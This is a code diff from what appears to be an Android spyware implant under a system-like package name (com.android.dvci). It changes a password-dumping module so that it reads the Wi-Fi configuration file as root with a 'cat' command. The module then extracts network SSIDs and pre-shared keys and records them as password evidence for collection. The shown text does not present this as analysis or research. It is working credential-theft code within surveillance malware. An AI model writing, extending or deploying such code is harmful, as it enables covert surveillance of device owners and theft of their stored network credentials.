@@ -13,11 +13,15 @@ import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.Path;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
 import java.io.File;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -130,17 +134,12 @@ public class ModulePassword extends BaseModule {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 		}
-		if (!Path.unprotect(filename, 2, true)) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpWifi) no passwords found");
-			}
-			if (Cfg.DEBUG) {
-				File file = new File(filename);
-				Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
-			}
+		ExecuteResult pers = Execute.executeRoot(M.e("cat ") + filename);
+		List<String> lines = new ArrayList(Arrays.asList(pers.getStdout().split("\\n")));
+
+		if (lines.isEmpty()) {
 			return false;
 		}
-		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
 		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
